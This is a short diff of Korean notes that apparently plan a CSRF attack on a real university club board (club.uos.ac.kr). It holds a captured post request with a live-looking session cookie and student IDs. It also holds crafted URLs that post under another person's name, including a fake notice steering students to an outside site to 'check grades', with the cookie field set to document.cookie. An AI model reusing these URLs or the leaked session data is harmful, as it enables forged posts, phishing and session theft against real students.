@@ -1,0 +1,34 @@
+1. 포털 로그인
+http://club.uos.ac.kr/lect/2019107102801
+
+2. 패킷 분석
+http://club.uos.ac.kr/service/rgboard/RGBoard.jsp?
+reply_seq=
+&viewtype=
+&page=1
+&brd_seq=415218
+&exec=write_proc
+&imgFileList=
+&imgFileValue=
+&useType=
+&fdValue_0=
+&fdValue_1=
+&fdValue_2=
+&fdValue_3=
+&fdValue_4=
+&title=제목
+&writername=작성자명
+&passwd=
+&fdFlagCount=0
+&noteContent=글 내용
+&ir1=
+&WFCookie=JSESSIONID%3DK6Y7ejgL84NqHmR0goN7JepHsREKBkzviiLuWEJw2rMUuEfZy8VwyNIzGJOQYllM%3B+CLUB_MAIL%3D2013640004%3B+pop_id%3DL2017206412501%3B+club_id%3DL2017206412501%3B+user_id%3D2013640004
+&file_count=0
+&clip_flag=Y
+
+2.
+http://club.uos.ac.kr/service/rgboard/RGBoard.jsp?reply_seq=&viewtype=&page=1&brd_seq=415217&exec=write_proc&imgFileList=&imgFileValue=&useType=&fdValue_0=&fdValue_1=&fdValue_2=&fdValue_3=&fdValue_4=&title=성적%20확인&writername=최혁&passwd=&fdFlagCount=0&noteContent=종강%20축하드립니다.%0A성적은%20다음%20사이트에서%20확인 가능합니다.  daer.dothome.co.kr&ir1=&WFCookie=document.cookie&file_count=0&clip_flag=Y&notice_check="Y"
+
+
+3.
+http://club.uos.ac.kr/service/rgboard/RGBoard.jsp?reply_seq=&viewtype=&page=1&brd_seq=415218&exec=write_proc&imgFileList=&imgFileValue=&useType=&fdValue_0=&fdValue_1=&fdValue_2=&fdValue_3=&fdValue_4=&title=CSRFhacking&passwd=&fdFlagCount=0&ir1=&WFCookie=document.cookie&file_count=0&clip_flag=Y
